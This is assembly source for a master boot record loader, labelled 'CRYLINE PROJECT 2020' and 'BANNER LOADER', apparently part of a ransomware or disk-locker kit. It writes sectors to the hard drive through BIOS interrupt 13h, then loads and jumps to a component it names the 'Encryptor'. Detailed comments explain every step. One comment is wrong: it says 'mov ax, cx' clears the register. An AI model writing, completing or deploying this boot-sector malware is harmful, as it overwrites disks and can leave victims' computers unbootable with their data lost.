;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE PROJECT 2020 ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;         v5.0         ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;   - BANNER LOADER -  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

bits16              ; <= Compiler options. Compile to .bin file extension
org 0x7c00          ; <= Reserve RAM address 0x0000:0x7c000 [SEGMENT:OFFSET]

mov ax, cx          ; <= Clean AX register
cli                 ; <= Interrupt off
mov es, ax          ; <= Clean ES segment, change memory address to 0x0000 [ES = 0x0000]
mov ds, ax          ; <= Clean data segment, change memory address to 0x0000 [DS = 0x0000]
mov ss, ax          ; <= Clean stack segment, change memory address to 0x0000 [SS = 0x0000]
mov fs, ax          ; <= Clean FS segment, change memory address to 0x0000 [FS = 0x0000]
mov gs, ax          ; <= Clean GS segment, change memory address to 0x0000 [GS = 0x0000]
sti                 ; <= Interrupt on

jmp silentMode      ; <= Jump to function 'silentMode'

silentMode:                    
        mov bx, 0xAAAA         ; <= Set segment address to BX register
        mov es, bx             ; <= Move BX register to ES segment register | ES = 0xAAAA
        mov bx, 0              ; <= Set 0x0000 offset to BX

        mov ah, 0x03           ; <= Set function 'writing' in 13h interrupt
        mov al, 3              ; <= Set 'how sectors write of hard drive'
        mov dh, 0              ; <= Set header of hard drive
        mov ch, 0              ; <= Set cylinder of hard drive
        mov cl, 4              ; <= Set start sector
        int 0x13               ; <= Use 13h interrupt
        jc silentMode          ; <= If error -> Try to writing again

        jmp loadingEncryptor   ; <= Jump to function 'loadingEncryptor'

loadingEncryptor:              ; <= Function 'loadingEncryptor'
        mov bx, 0x1000         ; <= Set memory address [Segment] for reading hard drive sector in this memory segment
        mov es, bx             ; <= Move this sector to ES register [ES segment register]
        mov bx, 0              ; <= Move to BX offset number | So, this function reading hard drive and uploading readed bytecode to RAM address: 0x1000:0x0000
        
        mov ah, 0x02           ; <= Set function 'Reading' of 13h interrupt | AH = 0x02 - Reading, AH = 0x03 - Writing
        mov al, 2              ; <= Set 'How many sesctors reading'
        mov dh, 0              ; <= Set hard drive header
        mov ch, 0              ; <= Set hard drive cylinder
        mov cl, 2              ; <= Set pointer for start reading | SetFilePointer(third sector of hard drive);
        int 0x13               ; <= Use 13h interrupt
        jc loadingEncryptor    ; <= If error - reading again
                               ; <= Else...
        mov ax, 0x1000         ; <= Move to AX new segment [RAM address]
        mov ds, ax             ; <= Move this segment to DS segment register | Set DS = 0x1000
        mov es, ax             ; <= Move this segment to ES segment register | Set ES = 0x1000
        mov fs, ax             ; <= Move this segment to FS segment register | Set FS = 0x1000
        mov gs, ax             ; <= Move this segment to GS segment register | Set GS = 0x1000
        mov ss, ax             ; <= Move this segment to SS segment register | Set SS = 0x1000

        jmp 0x1000:0           ; <= Jump to Encryptor memory address [SEGMENT:OFFSET]

times 510-($-$$) db 0          ; <= Add some null bytes to 510 bytes, because size of MBR - 512 bytes [GENERAL PART, 446 bytes] + [PARTITION TABLE, 64 bytes] + [MBR SIGNATURE, 2 bytes]
dw 0xAA55                      ; <= Add 2 bytes MBR signature